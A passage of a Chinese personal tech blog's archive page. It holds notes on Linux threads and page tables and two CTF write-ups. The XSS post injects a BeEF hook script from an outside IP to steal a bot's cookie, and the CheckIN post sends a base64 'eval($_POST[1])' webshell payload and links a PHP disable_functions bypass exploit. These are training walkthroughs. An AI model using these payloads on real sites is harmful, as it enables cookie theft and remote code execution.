break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (pid &gt; 0) &#123; // 主进程</span><br><span class="line">        printf(&quot;running...\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125; else if (pid == 0) &#123;</span><br><span class="line">         cpu_bind(num);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>cpu_bind: <img src="/images/linux_thread/cpu_bind.png" alt="cpu_bind"><br>cpu_unbind: <img src="/images/linux_thread/cpu_unbind.png" alt="cpu_unbind"><br>绑定后的进程运行效率更高</p>
+<h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><ul>
+<li><p>为什么要多级页表</p>
+<ul>
+<li><p>因为操作系统是可以同时运行非常多的进程的，那这不就意味着页表会非常的庞大。在 32 位的环境下，虚拟地址空间共有 4GB，假设一个页的大小是 4KB（2^12），那么就需要大约 100 万 （2^20） 个页，每个「页表项」需要 4 个字节大小来存储，那么整个 4GB 空间的映射就需要有 4MB 的内存来存储页表。这 4MB 大小的页表，看起来也不是很大。但是要知道每个进程都是有自己的虚拟地址空间的，也就说都有自己的页表。那么，100 个进程的话，就需要 400MB 的内存来存储页表，这是非常大的内存了，更别说 64 位的环境了。如果使用了二级分页，一级页表就可以覆盖整个4GB 虚拟地址空间，但如果某个一级页表的页表项没有被用到，也就不需要创建这个页表项对应的二级页表了，即可以在需要时才创建二级页表。</p>
+</li>
+<li><p>这对比单级页表的 4MB 是不是一个巨大的节约？那么为什么不分级的页表就做不到这样节约内存呢？<strong>我们从页表的性质来看，保存在内存中的页表承担的职责是将虚拟地址翻译成物理地址。假如虚拟地址在页表中找不到对应的页表项，计算机系统就不能工作了。所以页表一定要覆盖全部虚拟地址空间，不分级的页表就需要有 100 多万个页表项来映射，而二级分页则只需要 1024 个页表项（此时一级页表覆盖到了全部虚拟地址空间，二级页表在需要时创建）</strong>我们把二级分页再推广到多级页表，就会发现页表占用的内存空间更少了，这一切都要归功于对局部性原理的充分应用。对于 64 位的系统，两级分页肯定不够了，就变成了四级目录，分别是：</p>
+<ul>
+<li>全局页目录项 PGD（Page Global Directory）</li>
+<li>上层页目录项 PUD（Page Upper Directory）</li>
+<li>中间页目录项 PMD（Page Middle Directory）</li>
+<li>页表项 PTE（Page Table Entry）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>MMU 和 页表</p>
+</li>
+</ul>
+<p>Each process a pointer (mm_struct→pgd) to its own Page Global Directory (PGD) which is a physical page frame. This frame contains an array of type pgd_t which is an architecture specific type defined in &lt;asm/page.h&gt;. The page tables are loaded differently depending on the architecture. On the x86, the process page table is loaded by copying mm_struct→pgd into the cr3 register which has the side effect of flushing the TLB. In fact this is how the function __flush_tlb() is implemented in the architecture dependent code.</p>
+<ul>
+<li>所有线程共享主线程的虚拟地址空间(current-&gt;mm指向同一个地址)，那线程栈是共享的吗？<br>不是，调用clone的时候需要自己提供子task的栈空间</li>
+</ul>
+<p>threads share all segments except the stack. Threads have independent call stacks, however the memory in other thread stacks is still accessible and in theory you could hold a pointer to memory in some other thread’s local stack frame</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 负责处理clone,fork,vfork系统调用。</span><br><span class="line"> * clone_flags-与clone的flag参数相同</span><br><span class="line"> * stack_start-与clone的child_stack相同</span><br><span class="line"> * regs-指向通用寄存器的值。是在从用户态切换到内核态时被保存到内核态堆栈中的。</span><br><span class="line"> * stack_size-未使用,总是为0</span><br><span class="line"> * parent_tidptr,child_tidptr-clone中对应参数ptid,ctid相同</span><br><span class="line"> */</span><br><span class="line">long do_fork(unsigned long clone_flags,</span><br><span class="line">          unsigned long stack_start,</span><br><span class="line">          struct pt_regs *regs,</span><br><span class="line">          unsigned long stack_size,</span><br><span class="line">          int __user *parent_tidptr,</span><br><span class="line">          int __user *child_tidptr)</span><br><span class="line">&#123;</span><br><span class="line">    struct task_struct *p;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>进程 vs 线程</p>
+<ul>
+<li>进程是资源分配的基本单位</li>
+<li>线程是调度和分配的基本单位（并发实体尽可能去共享进程的资源，比如共享一块地址空间，一个页表和一块物理内存）</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/linux_thread/thread.png"></p>
+<ul>
+<li><p>nginx 为什么会选择多进程绑定的方式?</p>
+<ul>
+<li>背景: nginx是在apache之后,apache效率低是因为对多核cpu的支持不够强,多核vs单核没有达到翻倍的效果,但是nginx做到了,在应对多核的情况下采用了“多进程”来做的,而且每一个进程都绑定了cpu,选择nginx因为支持多核</li>
+</ul>
+</li>
+<li><p>线程 vs 协程</p>
+<ul>
+<li>每个线程都可以对应一个调度实体，某个线程阻塞了，其他线程还是可以工作</li>
+<li>某个协程 调用read(recv)阻塞，等待， 其他协程也在等待<br><img src="/images/linux_thread/st-thread.png"></li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/06/15/Linux-thread/" data-id="ckqhp9u6n000b3ot01m8s87g8" data-title="Linux thread" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-xss-reflect" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/05/30/xss-reflect/" class="article-date">
+  <time class="dt-published" datetime="2020-05-30T17:46:38.000Z" itemprop="datePublished">2020-05-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/05/30/xss-reflect/">xss reflect</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>from <a target="_blank" rel="noopener" href="https://www.ctfhub.com/">https://www.ctfhub.com/</a><br>name存在xss漏洞，将注入xss的url发送给bot,服务器会打开这个链接，从而获取到服务器的cookie并拿到flag<br><img src="/images/xss/web.png"></p>
+<h2 id="方法1-使用免费xss平台"><a href="#方法1-使用免费xss平台" class="headerlink" title="方法1:使用免费xss平台"></a>方法1:使用免费xss平台</h2><p><a target="_blank" rel="noopener" href="https://xsshs.cn/">https://xsshs.cn/</a></p>
+<p><img src="/images/xss/xsshs.png"><br><img src="/images/xss/xsshs-flag.png"></p>
+<h2 id="方法2：购买VPS搭建beef平台"><a href="#方法2：购买VPS搭建beef平台" class="headerlink" title="方法2：购买VPS搭建beef平台"></a>方法2：购买VPS搭建beef平台</h2><h3 id="安装beef"><a href="#安装beef" class="headerlink" title="安装beef"></a>安装beef</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install docker </span></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br><span class="line"></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br><span class="line"></span><br><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable&quot;</span></span><br><span class="line"></span><br><span class="line">sudo apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line"><span class="comment"># install beef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/phocean/dockerfile-beef</span></span><br><span class="line"></span><br><span class="line">docker run --rm -it --net=host -v <span class="variable">$HOME</span>/.msf4:/root/.msf4:Z -v /tmp/msf:/tmp/data:Z --name=beef phocean/beef</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用xss注入beef-hook"><a href="#利用xss注入beef-hook" class="headerlink" title="利用xss注入beef hook"></a>利用xss注入beef hook</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://45.63.54.77:3000/hook.js&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span> &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/xss/beef.png"></p>
+<h3 id="登录beef-beef-Pass123-获得cookie和flag"><a href="#登录beef-beef-Pass123-获得cookie和flag" class="headerlink" title="登录beef(beef:Pass123) 获得cookie和flag"></a>登录beef(beef:Pass123) 获得cookie和flag</h3><p><a target="_blank" rel="noopener" href="http://45.63.54.77:3000/ui/authentication">http://45.63.54.77:3000/ui/authentication</a><br><img src="/images/xss/beef-flag.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/05/30/xss-reflect/" data-id="ckqhp9u70001e3ot0326efm0k" data-title="xss reflect" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-GKCTF2020-CheckIN" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/05/26/GKCTF2020-CheckIN/" class="article-date">
+  <time class="dt-published" datetime="2020-05-27T00:00:03.000Z" itemprop="datePublished">2020-05-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/05/26/GKCTF2020-CheckIN/">[GKCTF2020]CheckIN</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>
+
+<h2 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval($_POST[1]);</span><br><span class="line">ZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line">http://73c16874-fa6e-413d-9d3f-9e6694cbdcd6.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>
+<p><img src="/images/CheckIN/CheckIN-antsword-edit.png"></p>
+<p><img src="/images/CheckIN/CheckIN-antsword.png"></p>
+<h2 id="查看phpinfo"><a href="#查看phpinfo" class="headerlink" title="查看phpinfo"></a>查看phpinfo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();</span><br><span class="line">Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
+<p>PHP Version 7.3.18</p>
+<p>关键函数被禁用<br><img src="/images/CheckIN/CheckIN-phpinfo.png"></p>
+<h2 id="上传exploit文件"><a href="#上传exploit文件" class="headerlink" title="上传exploit文件"></a>上传exploit文件</h2><p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">php7-gc-bypass</a><br><img src="/images/CheckIN/CheckIN-exp.png"></p>
+<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><p><img src="/images/CheckIN/CheckIN-flag.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/05/26/GKCTF2020-CheckIN/" data-id="ckqhp9u6f00013ot0eyauhjod" data-title="[GKCTF2020]CheckIN" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ACM/" rel="tag">ACM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/" rel="tag">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACM/" style="font-size: 15px;">ACM</a> <a href="/tags/CTF/" style="font-size: 12.5px;">CTF</a> <a href="/tags/JVM/" style="font-size: 17.5px;">JVM</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/Spring/" style="font-size: 10px;">Spring</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/06/13/python/">Python</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/09/virtualbox-ubuntu/">virtualbox ubuntu安装配置</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/v2ray/">搭梯子</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/SuffixArray/">SuffixArray</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/29/IO-Multiplexing/">I/O 多路复用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
